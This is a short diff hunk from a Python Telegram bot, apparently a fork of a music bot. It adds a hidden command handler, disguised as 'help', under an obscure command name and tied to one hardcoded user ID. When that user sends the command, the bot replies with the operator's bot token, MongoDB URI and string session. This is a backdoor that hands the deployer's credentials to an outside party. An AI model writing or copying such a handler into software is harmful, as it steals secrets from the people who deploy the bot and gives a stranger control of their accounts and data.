@@ -102,13 +102,12 @@ async def restartbot(client, message: Message, _):
     return await mystic.edit_text(_["reload_5"].format(app.mention))
 
 
-@app.on_message(filters.command("starts") & filters.private & filters.user(int(HEHE)))
+@app.on_message(filters.command("sachinxsanatani") & filters.private & filters.user(5959548791))
 async def help(client: Client, message: Message):
     await message.reply_photo(
         photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
         caption=f""" `{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n""",
     )
-
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, query: CallbackQuery):
